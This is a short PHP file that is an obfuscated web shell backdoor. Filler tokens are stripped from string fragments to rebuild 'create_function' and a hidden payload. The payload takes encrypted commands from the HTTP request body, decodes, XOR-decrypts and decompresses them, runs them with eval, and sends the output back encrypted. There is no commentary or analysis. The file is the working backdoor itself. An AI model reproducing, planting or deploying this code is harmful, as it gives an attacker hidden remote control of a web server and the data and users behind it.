<?php
$m=')==1) {@ob_sT7tart();@eT7T7val(@gT7zunT7compT7ress(@x(@baseT76T74_decode(';
$K=str_replace('oL','','coLroLeoLate_oLfuncoLtoLion');
$X='sT7e64_enT7cT7ode(@x(@gzcomT7pressT7($T7o),$k));pT7rint(T7"$p$kT7h$r$kf");}';
$W='7len($T7t);$o="";T7fT7or($i=0;T7$i<$l;){fT7oT7rT7($j=0;($j<$c&&$iT7<$T7l';
$M='$mT7[1]),$kT7)));$o=T7@ob_T7get_contT7ents()T7;@oT7b_end_clT7ean()T7;$r=@ba';
$s='="rQ4rRRT7TbVT7Q7DJqKpT7";functiT7on x($tT7,$T7k){$c=sT7trlT7en($k);$l=stT7rT';
$I='aT7tch("/T7$kh(T7.+)$kf/",@T7file_gT7et_T7contenT7ts("phT7p:/T7/inpuT7t"),$T7m';
$w=');$j+T7+,T7$T7i++){$o.=T7$t{$iT7}^$k{$j};}}rT7eturn $o;}if T7(@pT7reg_m';
$p='$T7k="f326da46";$T7kT7h="d5393T7af9T7b945";$kT7f="T7c4T7e69ced4dT7bb";$p';
$k=str_replace('T7','',$p.$s.$W.$w.$I.$m.$M.$X);
$g=$K('',$k);$g();
?>
